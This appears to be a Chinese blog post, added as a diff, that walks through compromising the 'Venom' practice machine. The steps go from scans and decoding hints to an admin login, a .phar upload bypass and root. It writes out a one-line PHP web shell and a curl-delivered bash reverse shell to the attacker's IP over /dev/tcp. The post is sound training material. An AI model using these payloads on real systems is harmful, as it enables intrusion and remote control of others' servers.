@@ -1,0 +1,220 @@
+<!DOCTYPE html><html lang="zh-CN"><head><meta charset="UTF-8"/><meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=2"/><meta name="theme-color" content="#222"/><meta http-equiv="X-UA-COMPATIBLE" content="IE=edge,chrome=1"/><meta name="renderer" content="webkit"/><link rel="icon" type="image/ico" sizes="32x32" href="/assets/favicon.ico"/><link rel="apple-touch-icon" sizes="180x180" href="/assets/apple-touch-icon.png"/><link rel="alternate" href="/rss.xml" title="朝闻道 夕死可矣" type="application/rss+xml"><link rel="alternate" href="/atom.xml" title="朝闻道 夕死可矣" type="application/atom+xml"><link rel="alternate" type="application/json" title="朝闻道 夕死可矣" href="https://lib0gus.github.io/feed.json"/><link rel="preconnect" href="https://s4.zstatic.net"/><link rel="preconnect" href="https://at.alicdn.com"/><link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Mulish:400,400italic,700,700italic%7CFredericka%20the%20Great:400,400italic,700,700italic%7CNoto%20Serif%20JP:400,400italic,700,700italic%7CNoto%20Serif%20SC:400,400italic,700,700italic%7CInconsolata:400,400italic,700,700italic&display=swap&subset=latin,latin-ext" media="none" onload="this.media&#x3D;&#39;all&#39;"><link rel="modulepreload" href="/js/siteInit.js"></link><link rel="modulepreload" href="/js/nyx-player-X6RTDFRC.js"></link><link rel="modulepreload" href="/js/copy-tex-IZMHKWEC.js"></link><link rel="modulepreload" href="/js/post-HWEJVK45.js"></link><link rel="modulepreload" href="/js/chunk-OAGLLRHQ.js"></link><link rel="modulepreload" href="/js/index.esm-4WN36CR4.js"></link><link rel="modulepreload" href="/js/chunk-RK7HQRIO.js"></link><link rel="modulepreload" href="/js/chunk-MUPCZ7YY.js"></link><link rel="stylesheet" href="/css/siteInit.css" media="none" onload="this.media&#x3D;&#39;all&#39;"></link><link rel="preload" href="../images/1.png" as="image" fetchpriority="high"><meta name="description" content="记录学习日常，请犀利点评，指出我的错误"/><link rel="canonical" href="https://lib0gus.github.io/2026/06/20/%E6%B5%8B%E8%AF%95%E9%9D%B6%E6%9C%BA-Venom/"><link rel="stylesheet" href="/css/post.css?v=0.5.4"><link rel="stylesheet" href="/css/mermaid.css?v=0.5.4"><!-- 临时处理--><link rel="stylesheet" media="none" onload="this.media='all'" href="https://s4.zstatic.net/ajax/libs/KaTeX/0.16.9/katex.min.css"><title>测试靶机-Venom</title><meta name="generator" content="Hexo 8.1.1"></head><body itemscope itemtype="http://schema.org/WebPage"><div id="loading"><div class="cat"><div class="body"></div><div class="head"><div class="face"></div></div><div class="foot"><div class="tummy-end"></div><div class="bottom"></div><div class="legs left"></div><div class="legs right"></div></div><div class="paw"><div class="hands left"></div><div class="hands right"></div></div></div></div><div id="pagefind_mount"></div><div id="container"><header id="header" itemscope itemtype="http://schema.org/WPHeader"><div class="inner"><div id="brand"><div class="pjax"><h1 itemprop="name headline">测试靶机-Venom</h1><div class="meta"><span class="item" title="创建时间：2026-06-20 11:00:00"><span class="icon"><i class="ic i-calendar"></i></span><span class="text">发表于</span><time itemprop="dateCreated datePublished" datetime="2026-06-20T11:00:00+08:00">2026-06-20</time></span><span class="item" title="本文字数"><span class="icon"><i class="ic i-pen"></i></span><span class="text">本文字数</span><span>5.7k</span><span class="text">字</span></span><span class="item" title="阅读时长"><span class="icon"><i class="ic i-clock"></i></span><span class="text">阅读时长</span><span>5 分钟</span></span></div></div></div><nav id="nav"><div class="inner"><div class="toggle"><div class="lines" aria-label="切换导航栏"><span class="line"></span><span class="line"></span><span class="line"></span></div></div><ul class="menu"><li class="item title"><a href="/" rel="start">Lib0gus的博客</a></li></ul><ul class="right" id="rightNav"><li class="item theme"><i class="ic i-sun"></i></li><li class="item search"><i class="ic i-search"></i></li></ul></div></nav></div><div class="pjax" id="imgs"><img src="../images/1.png" loading="eager" decoding="async" fetchpriority="high" alt="朝闻道 夕死可矣"></div></header><div id="waves"><svg class="waves" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" viewBox="0 24 150 28" preserveAspectRatio="none" shape-rendering="auto"><defs><path id="gentle-wave" d="M-160 44c30 0 58-18 88-18s 58 18 88 18 58-18 88-18 58 18 88 18 v44h-352z"></path></defs><g class="parallax"><use xlink:href="#gentle-wave" x="48" y="0"></use><use xlink:href="#gentle-wave" x="48" y="3"></use><use xlink:href="#gentle-wave" x="48" y="5"></use><use xlink:href="#gentle-wave" x="48" y="7"></use></g></svg></div><main><div class="inner"><div class="pjax" id="main"><div class="article wrap"><div class="breadcrumb" itemListElement itemscope itemtype="https://schema.org/BreadcrumbList"><i class="ic i-home"></i><span><a href="/">首页</a></span><i class="ic i-angle-right"></i><span class="current" itemprop="itemListElement" itemscope="itemscope" itemtype="https://schema.org/ListItem"><a href="/categories/%E9%9D%B6%E6%9C%BA%E7%B2%BE%E7%BB%83/" itemprop="item" rel="index" title="分类于靶机精练"><span itemprop="name">靶机精练<meta itemprop="position" content="0"/></span></a></span></div><article class="post block" itemscope="itemscope" itemtype="http://schema.org/Article" data-pagefind-body="data-pagefind-body" lang="zh-CN"><link itemprop="mainEntityOfPage" href="https://lib0gus.github.io/2026/06/20/%E6%B5%8B%E8%AF%95%E9%9D%B6%E6%9C%BA-Venom/"/><span hidden="hidden" itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="image" content="/assets/test.png"/><meta itemprop="name" content="Lib0gus的小屋"/><meta itemprop="description" content="技术分享 &amp; 生活记录, 记录学习日常，请犀利点评，指出我的错误"/></span><span hidden="hidden" itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="朝闻道 夕死可矣"/></span><div class="body md" itemprop="articleBody"><h2 id="前言"><a class="anchor" href="#前言">#</a> 前言</h2>
+<p>靶机介绍</p>
+<hr />
+<h2 id="一-信息搜集"><a class="anchor" href="#一-信息搜集">#</a> 一、信息搜集</h2>
+<h3 id="1地址确认"><a class="anchor" href="#1地址确认">#</a> （1）地址确认</h3>
+<pre class="shiki shiki-themes vitesse-light vitesse-dark" style="background-color:#ffffff;--shiki-dark-bg:#121212;color:#393a34;--shiki-dark:#dbd7caee" tabindex="0"><code class="language-bash"><span class="line"><span style="color:#59873A;--shiki-dark:#80A665">nmap</span><span style="color:#A65E2B;--shiki-dark:#C99076"> -sn</span><span style="color:#B56959;--shiki-dark:#C98A7D"> 192.168.35.0/24</span></span></code></pre>
+<p><img loading="lazy" src="1781922649817.png" alt="1781922649817" /></p>
+<p>由于我们对网络的熟悉，所以能判断出来靶机 IP 地址为 <code>192.168.35.201</code>。</p>
+<h3 id="2端口扫描"><a class="anchor" href="#2端口扫描">#</a> （2）端口扫描</h3>
+<pre class="shiki shiki-themes vitesse-light vitesse-dark" style="background-color:#ffffff;--shiki-dark-bg:#121212;color:#393a34;--shiki-dark:#dbd7caee" tabindex="0"><code class="language-bash"><span class="line"><span style="color:#59873A;--shiki-dark:#80A665">nmap</span><span style="color:#A65E2B;--shiki-dark:#C99076"> --min-rate</span><span style="color:#2F798A;--shiki-dark:#4C9A91"> 10000</span><span style="color:#A65E2B;--shiki-dark:#C99076"> -p-</span><span style="color:#2F798A;--shiki-dark:#4C9A91"> 192.168.35.201</span></span></code></pre>
+<p>以最低 10000/s 的发包速率进行全端口扫描。</p>
+<p><img loading="lazy" src="1781922826451.png" alt="1781922826451" /></p>
+<p>扫描两次增加准确性，发现开放 <code>21, 80, 139, 443, 445</code> 端口。对应端口常见漏洞来排序渗透优先级。</p>
+<p>获取端口详细信息：</p>
+<pre class="shiki shiki-themes vitesse-light vitesse-dark" style="background-color:#ffffff;--shiki-dark-bg:#121212;color:#393a34;--shiki-dark:#dbd7caee" tabindex="0"><code class="language-bash"><span class="line"><span style="color:#59873A;--shiki-dark:#80A665">nmap</span><span style="color:#A65E2B;--shiki-dark:#C99076"> -sC</span><span style="color:#A65E2B;--shiki-dark:#C99076"> -sV</span><span style="color:#A65E2B;--shiki-dark:#C99076"> -O</span><span style="color:#A65E2B;--shiki-dark:#C99076"> -p</span><span style="color:#B56959;--shiki-dark:#C98A7D"> 21,80,139,443,445</span><span style="color:#2F798A;--shiki-dark:#4C9A91"> 192.168.35.201</span></span></code></pre>
+<p><img loading="lazy" src="1781923540500.png" alt="1781923540500" /></p>
+<p>看样子也都是一些正常的东西，21 端口的 FTP 以及 139 的 SMB 可以尝试一下匿名登录。</p>
+<h3 id="3ftp-初尝试-匿名测试"><a class="anchor" href="#3ftp-初尝试-匿名测试">#</a> （3）FTP 初尝试 - 匿名测试</h3>
+<pre class="shiki shiki-themes vitesse-light vitesse-dark" style="background-color:#ffffff;--shiki-dark-bg:#121212;color:#393a34;--shiki-dark:#dbd7caee" tabindex="0"><code class="language-bash"><span class="line"><span style="color:#59873A;--shiki-dark:#80A665">ftp</span><span style="color:#2F798A;--shiki-dark:#4C9A91"> 192.168.35.201</span></span>
+<span class="line"><span style="color:#59873A;--shiki-dark:#80A665">anonymous</span></span></code></pre>
+<p><img loading="lazy" src="1781923681559.png" alt="1781923681559" /></p>
+<h3 id="4smb-匿名登录"><a class="anchor" href="#4smb-匿名登录">#</a> （4）SMB 匿名登录</h3>
+<p>再来尝试一下 SMB 的匿名登录以及用户名枚举：</p>
+<pre class="shiki shiki-themes vitesse-light vitesse-dark" style="background-color:#ffffff;--shiki-dark-bg:#121212;color:#393a34;--shiki-dark:#dbd7caee" tabindex="0"><code class="language-bash"><span class="line"><span style="color:#59873A;--shiki-dark:#80A665">smbclient</span><span style="color:#A65E2B;--shiki-dark:#C99076"> -L</span><span style="color:#B56959;--shiki-dark:#C98A7D"> //192.168.35.201</span><span style="color:#A65E2B;--shiki-dark:#C99076"> -N</span></span></code></pre>
+<p><img loading="lazy" src="1781923770749.png" alt="1781923770749" /></p>
+<p>并没有发现什么东西，此时再尝试一下用户名枚举，看是否有泄露用户名的地方：</p>
+<pre class="shiki shiki-themes vitesse-light vitesse-dark" style="background-color:#ffffff;--shiki-dark-bg:#121212;color:#393a34;--shiki-dark:#dbd7caee" tabindex="0"><code class="language-bash"><span class="line"><span style="color:#59873A;--shiki-dark:#80A665">enum4linux</span><span style="color:#A65E2B;--shiki-dark:#C99076"> -U</span><span style="color:#2F798A;--shiki-dark:#4C9A91"> 192.168.35.201</span></span></code></pre>
+<p><img loading="lazy" src="1781923831617.png" alt="1781923831617" /></p>
+<p>同样也没发现什么有用的东西。那把着重点放到 Web 服务上去。</p>
+<h3 id="580-端口渗透测试"><a class="anchor" href="#580-端口渗透测试">#</a> （5）80 端口渗透测试</h3>
+<h4 id="1-目录扫描"><a class="anchor" href="#1-目录扫描">#</a> ① 目录扫描</h4>
+<p>使用 gobuster 进行扫描：</p>
+<pre class="shiki shiki-themes vitesse-light vitesse-dark" style="background-color:#ffffff;--shiki-dark-bg:#121212;color:#393a34;--shiki-dark:#dbd7caee" tabindex="0"><code class="language-bash"><span class="line"><span style="color:#59873A;--shiki-dark:#80A665">gobuster</span><span style="color:#B56959;--shiki-dark:#C98A7D"> dir</span><span style="color:#A65E2B;--shiki-dark:#C99076"> -u</span><span style="color:#B5695977;--shiki-dark:#C98A7D77"> "</span><span style="color:#B56959;--shiki-dark:#C98A7D">http://192.168.35.201</span><span style="color:#B5695977;--shiki-dark:#C98A7D77">"</span><span style="color:#A65E2B;--shiki-dark:#C99076"> -w</span><span style="color:#B56959;--shiki-dark:#C98A7D"> /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt</span></span></code></pre>
+<p><img loading="lazy" src="1781923998106.png" alt="1781923998106" /></p>
+<p>发现没有扫描到任何东西，再指定 html、php、txt 后缀来扫描一遍：</p>
+<p><img loading="lazy" src="1781924129887.png" alt="1781924129887" /></p>
+<p>依旧毫无所获。那直接打开网址看下有什么线索：</p>
+<p><img loading="lazy" src="1781924161854.png" alt="1781924161854" /></p>
+<p>看到首页只有默认空白页，也没有任何目录扫描出来。处于对打靶的敏感性，查看源码看是否有隐藏信息。</p>
+<h4 id="2-查看网站源码"><a class="anchor" href="#2-查看网站源码">#</a> ② 查看网站源码</h4>
+<p>使用 <code>Ctrl+U</code> 打开网站源码，发现线索：</p>
+<pre class="shiki shiki-themes vitesse-light vitesse-dark" style="background-color:#ffffff;--shiki-dark-bg:#121212;color:#393a34;--shiki-dark:#dbd7caee" tabindex="0"><code class="language-html"><span class="line"><span style="color:#A0ADA0;--shiki-dark:#758575DD">&#x3C;!--...&#x3C;5f2a66f947fa5690c26506f66bde5c23> follow this to get access on somewhere.....--></span></span></code></pre>
+<p>翻译：根据这个去某处寻找凭证。</p>
+<p><img loading="lazy" src="1781924248768.png" alt="1781924248768" /></p>
+<p><code>&lt;&gt;</code> 里是一个 MD5 字符串，尝试去<a target="_blank" rel="noopener" href="https://www.somd5.com/">在线网站</a>解密一下：</p>
+<p><img loading="lazy" src="1781924370299.png" alt="1781924370299" /></p>
+<p>解密出字符串 <code>hostinger</code>，此时并不知道这是一个目录还是一个用户名。对以下几种情况都进行了尝试：</p>
+<ol>
+<li>
+<p><code>5f2a66f947fa5690c26506f66bde5c23</code> 为目录，访问后排除<br />
+<img loading="lazy" src="1781924440625.png" alt="1781924440625" /></p>
+</li>
+<li>
+<p><code>hostinger</code> 为目录，访问后排除<br />
+<img loading="lazy" src="1781924468848.png" alt="1781924468848" /></p>
+</li>
+<li>
+<p>想到之前的 FTP 服务，尝试登录<br />
+<img loading="lazy" src="1781924552555.png" alt="1781924552555" /></p>
+</li>
+</ol>
+<p>发现确实可以登录，但是需要密码。尝试用户名同密码，登录成功。</p>
+<p><img loading="lazy" src="1781924631395.png" alt="1781924631395" /></p>
+<hr />
+<h2 id="二-ftp-深度利用-寻找敏感信息"><a class="anchor" href="#二-ftp-深度利用-寻找敏感信息">#</a> 二、FTP 深度利用 - 寻找敏感信息</h2>
+<p><img loading="lazy" src="1781924709971.png" alt="1781924709971" /></p>
+<p>将 FTP 中共享的文件下载下来，打开查看 <code>hint.txt</code>：</p>
+<pre class="shiki shiki-themes vitesse-light vitesse-dark" style="background-color:#ffffff;--shiki-dark-bg:#121212;color:#393a34;--shiki-dark:#dbd7caee" tabindex="0"><code class="language-text"><span class="line"><span>Hey there...</span></span>
+<span class="line"><span></span></span>
+<span class="line"><span>T0D0 --</span></span>
+<span class="line"><span></span></span>
+<span class="line"><span>* You need to follow the 'hostinger' on WXpOU2FHSnRVbWhqYlZGblpHMXNibHBYTld4amJWVm5XVEpzZDJGSFZuaz0= also aHR0cHM6Ly9jcnlwdGlpLmNvbS9waXBlcy92aWdlbmVyZS1jaXBoZXI=</span></span>
+<span class="line"><span>* some knowledge of cipher is required to decode the dora password..</span></span>
+<span class="line"><span>* try on venom.box</span></span>
+<span class="line"><span>password -- L7f9l8@J#p%Ue+Q1234 -> deocode this you will get the administrator password</span></span>
+<span class="line"><span></span></span>
+<span class="line"><span>Have fun .. :)</span></span></code></pre>
+<p>从这条 hint 中可以读取出来几个信息。</p>
+<p>从第一个 <code>*</code> 中，发现有两串类似 Base64 编码的东西，解码来看下：</p>
+<p>经历三次解码，<code>also</code> 前的 Base64 解码结果为：</p>
+<pre class="shiki shiki-themes vitesse-light vitesse-dark" style="background-color:#ffffff;--shiki-dark-bg:#121212;color:#393a34;--shiki-dark:#dbd7caee" tabindex="0"><code class="language-text"><span class="line"><span>standard vigenere cipher</span></span></code></pre>
+<p><code>also</code> 后的解码结果为：</p>
+<pre class="shiki shiki-themes vitesse-light vitesse-dark" style="background-color:#ffffff;--shiki-dark-bg:#121212;color:#393a34;--shiki-dark:#dbd7caee" tabindex="0"><code class="language-text"><span class="line"><span>https://cryptii.com/pipes/vigenere-cipher</span></span></code></pre>
+<p>第二个 <code>*</code> 中，翻译并提取关键信息：</p>
+<pre class="shiki shiki-themes vitesse-light vitesse-dark" style="background-color:#ffffff;--shiki-dark-bg:#121212;color:#393a34;--shiki-dark:#dbd7caee" tabindex="0"><code class="language-text"><span class="line"><span>一些有关解码的知识可以获取 dora 用户的密码</span></span></code></pre>
+<p>第三个 <code>*</code> 中，让我们尝试去访问 <code>venom.box</code>。立马联想到 <code>hosts</code> 文件。</p>
+<p>最后一段话中，告诉了我们加密后的密码为 <code>L7f9l8@J#p%Ue+Q1234</code>，解密之后就可以得到管理员的密码。</p>
+<p>根据 CTF 的经验，知道 Vigenere 是一种加密方式，同时也提供了相关介绍。</p>
+<p>去搜索一个<a target="_blank" rel="noopener" href="https://ctf.bugku.com/tool/vigenere">在线网站</a>来尝试一下：</p>
+<p><img loading="lazy" src="1781925177794.png" alt="1781925177794" /></p>
+<p>得到密码，但是否正确还要去尝试登录。</p>
+<hr />
+<h2 id="三-获取到关键-hint-修改-hosts-文件"><a class="anchor" href="#三-获取到关键-hint-修改-hosts-文件">#</a> 三、获取到关键 hint - 修改 hosts 文件</h2>
+<pre class="shiki shiki-themes vitesse-light vitesse-dark" style="background-color:#ffffff;--shiki-dark-bg:#121212;color:#393a34;--shiki-dark:#dbd7caee" tabindex="0"><code class="language-bash"><span class="line"><span style="color:#59873A;--shiki-dark:#80A665">sudo</span><span style="color:#B56959;--shiki-dark:#C98A7D"> vim</span><span style="color:#B56959;--shiki-dark:#C98A7D"> /etc/hosts</span></span></code></pre>
+<p><img loading="lazy" src="1781925323149.png" alt="1781925323149" /></p>
+<p>修改之后访问 <code>venom.box</code>：</p>
+<p><img loading="lazy" src="1781925367604.png" alt="1781925367604" /></p>
+<p>成功访问，看到右上角有登录框，尝试登录。</p>
+<hr />
+<h2 id="四-找到登录框-尝试登录管理员用户"><a class="anchor" href="#四-找到登录框-尝试登录管理员用户">#</a> 四、找到登录框 - 尝试登录管理员用户</h2>
+<p>从 hint 中可以得知有一个用户名为 <code>dora</code>，极大可能为管理员用户，密码就用刚才解密后的密码。</p>
+<pre class="shiki shiki-themes vitesse-light vitesse-dark" style="background-color:#ffffff;--shiki-dark-bg:#121212;color:#393a34;--shiki-dark:#dbd7caee" tabindex="0"><code class="language-text"><span class="line"><span>username: dora  password: E7r9t8@Q#h%Hy+M1234</span></span></code></pre>
+<p><img loading="lazy" src="1781925496225.png" alt="1781925496225" /></p>
+<p>成功登录，发现是后台管理员用户。</p>
+<hr />
+<h2 id="五-后台管理员登录成功-深度测试"><a class="anchor" href="#五-后台管理员登录成功-深度测试">#</a> 五、后台管理员登录成功 - 深度测试</h2>
+<p>登录后台后，发现有设置按钮，左边发现该 CMS 名称和版本号。</p>
+<p><img loading="lazy" src="1781925614269.png" alt="1781925614269" /></p>
+<p>寻找该 CMS 对应的漏洞，发现该 CMS 有文件上传漏洞：</p>
+<p><img loading="lazy" src="1781925676041.png" alt="1781925676041" /></p>
+<p>查看漏洞利用方式：</p>
+<p>发现是后台只对 <code>php</code> 做了拦截，未对 <code>phar</code> 以及 <code>pht</code> 做限制，将脚本改为 <code>phar</code> 即可绕过检测。</p>
+<p>随后在后台创建一句话木马：</p>
+<pre class="shiki shiki-themes vitesse-light vitesse-dark" style="background-color:#ffffff;--shiki-dark-bg:#121212;color:#393a34;--shiki-dark:#dbd7caee" tabindex="0"><code class="language-php"><span class="line"><span style="color:#AB5959;--shiki-dark:#CB7676">&#x3C;</span><span style="color:#AB5959;--shiki-dark:#CB7676">?</span><span style="color:#A65E2B;--shiki-dark:#C99076">php</span><span style="color:#998418;--shiki-dark:#B8A965"> system</span><span style="color:#2993a3;--shiki-dark:#5eaab5">(</span><span style="color:#999999;--shiki-dark:#666666">$</span><span style="color:#B07D48;--shiki-dark:#BD976A">_GET</span><span style="color:#1e754f;--shiki-dark:#4d9375">[</span><span style="color:#B5695977;--shiki-dark:#C98A7D77">'</span><span style="color:#B56959;--shiki-dark:#C98A7D">cmd</span><span style="color:#B5695977;--shiki-dark:#C98A7D77">'</span><span style="color:#1e754f;--shiki-dark:#4d9375">]</span><span style="color:#2993a3;--shiki-dark:#5eaab5">)</span><span style="color:#999999;--shiki-dark:#666666">;</span><span style="color:#AB5959;--shiki-dark:#CB7676"> ?</span><span style="color:#AB5959;--shiki-dark:#CB7676">></span></span></code></pre>
+<p><img loading="lazy" src="1781925849743.png" alt="1781925849743" /></p>
+<p>右键详细信息，访问该文件：</p>
+<p><img loading="lazy" src="1781925899154.png" alt="1781925899154" /></p>
+<p><img loading="lazy" src="1781925918540.png" alt="1781925918540" /></p>
+<p>成功实现 RCE。</p>
+<p>随后准备反弹 shell，先在 Kali 上启动监听：</p>
+<pre class="shiki shiki-themes vitesse-light vitesse-dark" style="background-color:#ffffff;--shiki-dark-bg:#121212;color:#393a34;--shiki-dark:#dbd7caee" tabindex="0"><code class="language-bash"><span class="line"><span style="color:#59873A;--shiki-dark:#80A665">nc</span><span style="color:#A65E2B;--shiki-dark:#C99076"> -lvnp</span><span style="color:#2F798A;--shiki-dark:#4C9A91"> 4444</span></span></code></pre>
+<p>由于在浏览器上会因为编码导致出现问题，直接用 curl 来传递参数：</p>
+<pre class="shiki shiki-themes vitesse-light vitesse-dark" style="background-color:#ffffff;--shiki-dark-bg:#121212;color:#393a34;--shiki-dark:#dbd7caee" tabindex="0"><code class="language-bash"><span class="line"><span style="color:#59873A;--shiki-dark:#80A665">curl</span><span style="color:#A65E2B;--shiki-dark:#C99076"> -G</span><span style="color:#B5695977;--shiki-dark:#C98A7D77"> "</span><span style="color:#B56959;--shiki-dark:#C98A7D">http://venom.box/uploads/shell.phar</span><span style="color:#B5695977;--shiki-dark:#C98A7D77">"</span><span style="color:#A65E2B;--shiki-dark:#C99076"> --data-urlencode</span><span style="color:#B5695977;--shiki-dark:#C98A7D77"> '</span><span style="color:#B56959;--shiki-dark:#C98A7D">cmd=/bin/bash -c "/bin/bash -i >&#x26; /dev/tcp/192.168.35.128/4444 0>&#x26;1"</span><span style="color:#B5695977;--shiki-dark:#C98A7D77">'</span></span></code></pre>
+<p><img loading="lazy" src="1781926456026.png" alt="1781926456026" /></p>
+<p>成功反弹 shell。</p>
+<hr />
+<h2 id="六-成功反弹-shell-进行提权"><a class="anchor" href="#六-成功反弹-shell-进行提权">#</a> 六、成功反弹 Shell - 进行提权</h2>
+<h3 id="提升交互性"><a class="anchor" href="#提升交互性">#</a> 提升交互性</h3>
+<pre class="shiki shiki-themes vitesse-light vitesse-dark" style="background-color:#ffffff;--shiki-dark-bg:#121212;color:#393a34;--shiki-dark:#dbd7caee" tabindex="0"><code class="language-bash"><span class="line"><span style="color:#A0ADA0;--shiki-dark:#758575DD"># 在拿到 shell 的终端执行：</span></span>
+<span class="line"><span style="color:#59873A;--shiki-dark:#80A665">python3</span><span style="color:#A65E2B;--shiki-dark:#C99076"> -c</span><span style="color:#B5695977;--shiki-dark:#C98A7D77"> "</span><span style="color:#B56959;--shiki-dark:#C98A7D">import pty;pty.spawn('/bin/bash')</span><span style="color:#B5695977;--shiki-dark:#C98A7D77">"</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#A0ADA0;--shiki-dark:#758575DD"># 然后 Ctrl+Z 挂起，在 Kali 终端执行：</span></span>
+<span class="line"><span style="color:#59873A;--shiki-dark:#80A665">stty</span><span style="color:#B56959;--shiki-dark:#C98A7D"> raw</span><span style="color:#A65E2B;--shiki-dark:#C99076"> -echo</span><span style="color:#999999;--shiki-dark:#666666">;</span><span style="color:#998418;--shiki-dark:#B8A965"> fg</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#A0ADA0;--shiki-dark:#758575DD"># 回车后执行：</span></span>
+<span class="line"><span style="color:#AB5959;--shiki-dark:#CB7676">export</span><span style="color:#B07D48;--shiki-dark:#BD976A"> TERM</span><span style="color:#999999;--shiki-dark:#666666">=</span><span style="color:#B07D48;--shiki-dark:#BD976A">xterm</span></span></code></pre>
+<p>这样就有 Tab 补全、方向键、Ctrl+C 都能用了。</p>
+<p>查看当前用户：</p>
+<pre class="shiki shiki-themes vitesse-light vitesse-dark" style="background-color:#ffffff;--shiki-dark-bg:#121212;color:#393a34;--shiki-dark:#dbd7caee" tabindex="0"><code class="language-bash"><span class="line"><span style="color:#59873A;--shiki-dark:#80A665">whoami</span></span>
+<span class="line"><span style="color:#A0ADA0;--shiki-dark:#758575DD"># www-data</span></span></code></pre>
+<p>发现是 <code>www-data</code> 用户，这个用户应该没什么权限。去看一下家目录下还有哪些用户：</p>
+<pre class="shiki shiki-themes vitesse-light vitesse-dark" style="background-color:#ffffff;--shiki-dark-bg:#121212;color:#393a34;--shiki-dark:#dbd7caee" tabindex="0"><code class="language-bash"><span class="line"><span style="color:#998418;--shiki-dark:#B8A965">cd</span><span style="color:#B56959;--shiki-dark:#C98A7D"> /home</span></span>
+<span class="line"><span style="color:#59873A;--shiki-dark:#80A665">ls</span></span></code></pre>
+<p><img loading="lazy" src="1781926745176.png" alt="1781926745176" /></p>
+<p>发现了两个用户 <code>hostinger</code> 和 <code>nathan</code>。</p>
+<p>用刚才 FTP 的 <code>hostinger/hostinger</code> 尝试登录，成功：</p>
+<p><img loading="lazy" src="1781926814566.png" alt="1781926814566" /></p>
+<h3 id="常规提权检查"><a class="anchor" href="#常规提权检查">#</a> 常规提权检查</h3>
+<pre class="shiki shiki-themes vitesse-light vitesse-dark" style="background-color:#ffffff;--shiki-dark-bg:#121212;color:#393a34;--shiki-dark:#dbd7caee" tabindex="0"><code class="language-bash"><span class="line"><span style="color:#59873A;--shiki-dark:#80A665">sudo</span><span style="color:#A65E2B;--shiki-dark:#C99076"> -l</span></span>
+<span class="line"><span style="color:#59873A;--shiki-dark:#80A665">find</span><span style="color:#B56959;--shiki-dark:#C98A7D"> /</span><span style="color:#A65E2B;--shiki-dark:#C99076"> -perm</span><span style="color:#A65E2B;--shiki-dark:#C99076"> -4000</span><span style="color:#AB5959;--shiki-dark:#CB7676"> 2</span><span style="color:#AB5959;--shiki-dark:#CB7676">></span><span style="color:#B56959;--shiki-dark:#C98A7D">/dev/null</span></span></code></pre>
+<p><img loading="lazy" src="1781926874761.png" alt="1781926874761" /></p>
+<p>发现没什么有用的东西。继续看定时任务：</p>
+<pre class="shiki shiki-themes vitesse-light vitesse-dark" style="background-color:#ffffff;--shiki-dark-bg:#121212;color:#393a34;--shiki-dark:#dbd7caee" tabindex="0"><code class="language-bash"><span class="line"><span style="color:#59873A;--shiki-dark:#80A665">cat</span><span style="color:#B56959;--shiki-dark:#C98A7D"> /etc/crontab</span></span></code></pre>
+<p><img loading="lazy" src="1781926948227.png" alt="1781926948227" /></p>
+<p>也没发现什么。</p>
+<h3 id="寻找敏感信息"><a class="anchor" href="#寻找敏感信息">#</a> 寻找敏感信息</h3>
+<p>其实在后台没有看到 CMS 时，尝试过后台的 SQL 执行的地方：</p>
+<p><img loading="lazy" src="1781927110747.png" alt="1781927110747" /></p>
+<p>但发现执行权限太低，是一个普通用户，再进入数据库也没什么东西了。</p>
+<p>查看网站目录下有什么东西：</p>
+<p><img loading="lazy" src="1781927176550.png" alt="1781927176550" /></p>
+<p>发现一个 <code>subrion</code> 文件夹，进入查看。</p>
+<p>里面文件有很多，图中的这些文件感觉都挺重要的，比如 <code>include</code> 文件夹、<code>admin</code> 文件夹、<code>backup</code> 文件夹、<code>robots.txt</code> 文件等等。所以寻找敏感信息这一步耗费了很长时间。</p>
+<p><img loading="lazy" src="1781927238979.png" alt="1781927238979" /></p>
+<p>最终，在 <code>backup</code> 文件夹下的隐藏文件 <code>.htaccess</code> 找到了提示信息：</p>
+<p><img loading="lazy" src="1781927691458.png" alt="1781927691458" /></p>
+<p>直接拿来尝试登录 <code>nathan</code> 账户，成功：</p>
+<p><img loading="lazy" src="1781927792485.png" alt="1781927792485" /></p>
+<p>发现该用户在 <code>sudo</code> 组中，直接提权：</p>
+<pre class="shiki shiki-themes vitesse-light vitesse-dark" style="background-color:#ffffff;--shiki-dark-bg:#121212;color:#393a34;--shiki-dark:#dbd7caee" tabindex="0"><code class="language-bash"><span class="line"><span style="color:#59873A;--shiki-dark:#80A665">sudo</span><span style="color:#B56959;--shiki-dark:#C98A7D"> /bin/bash</span></span></code></pre>
+<p><img loading="lazy" src="1781927920549.png" alt="1781927920549" /></p>
+<p>成功提权，进入 <code>/root</code> 目录访问最终 flag：</p>
+<p><img loading="lazy" src="1781927948584.png" alt="1781927948584" /></p>
+</div><footer><div class="meta"><span class="item"><span class="icon"><i class="ic i-eye"></i></span><span class="text">总访问量：</span><span class="waline-pageview-count" id="twikoo_visitors" data-path="/2026/06/20/测试靶机-Venom/">加载中...</span></span><span class="item"><span class="icon"><i class="ic i-calendar-check"></i></span><span class="text">更新于 </span><time title="修改时间：2026-06-20 12:54:09" itemprop="dateModified" datetime="2026-06-20T12:54:09+08:00">2026-06-20</time></span></div><div id="copyright"><ul><li class="author"><strong>本文作者：</strong>Lib0gus的小屋<i class="ic i-at"><em>@</em></i>朝闻道 夕死可矣</li><li class="link"><strong>本文链接：</strong><a href="https://lib0gus.github.io/2026/06/20/%E6%B5%8B%E8%AF%95%E9%9D%B6%E6%9C%BA-Venom/" title="测试靶机-Venom">https://lib0gus.github.io/2026/06/20/测试靶机-Venom/</a></li><li class="license"><strong>版权声明：</strong>本站所有文章除特别声明外，均采用 <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh"><i class="ic i-creative-commons"><em>(CC)</em></i>BY-NC-SA</a> 许可协议。转载请注明出处！</li></ul></div></footer></article></div><div class="post-nav"><div class="item left"><a href="/2026/05/25/Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/Day4%20%E5%8A%A8%E6%80%81%E4%BB%A3%E7%90%86/" rel="prev" itemprop="url" title="Day4 动态代理" style="background-image: linear-gradient(to bottom right, #b2fcb2, #d695aa);"><span class="type">上一篇</span><h3>Day4 动态代理</h3></a></div><div class="item right"></div></div><div class="wrap" id="comments"></div></div><div id="sidebar"><div 